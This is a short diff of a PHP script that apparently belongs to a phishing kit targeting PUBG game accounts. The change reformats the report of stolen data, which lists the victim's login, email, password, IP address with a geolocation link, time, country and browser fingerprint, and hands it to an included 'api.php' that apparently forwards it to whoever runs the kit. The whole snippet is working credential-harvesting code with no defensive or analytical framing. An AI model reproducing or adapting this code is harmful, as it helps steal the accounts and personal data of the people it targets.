@@ -58,19 +58,21 @@ $url =include("setting/.masuk.php");
 
 
 $msg = ("
-❗️=========== Result ACC ===========❗️
-
-
+[+]=========== ACC PUBG ===========[+]
 [Login] = ".$login."
-PUNYA SI  = ".$user."
-PASSWORD  = ".$pass."
+[Email]  = ".$email."
+[Pass]  = ".$password."
 
 [+]============System============[+]
 [IP INFO] = http://www.geoiptool.com/?IP=".$IP."
+
 [TIME/DATE] =".$times." / ".$date."
+
 [Country] = ".$country."
+
 [FINGERPRINT] = ".$useragent."
 ");
+
 $url = $msg;include("api.php");
 
 }
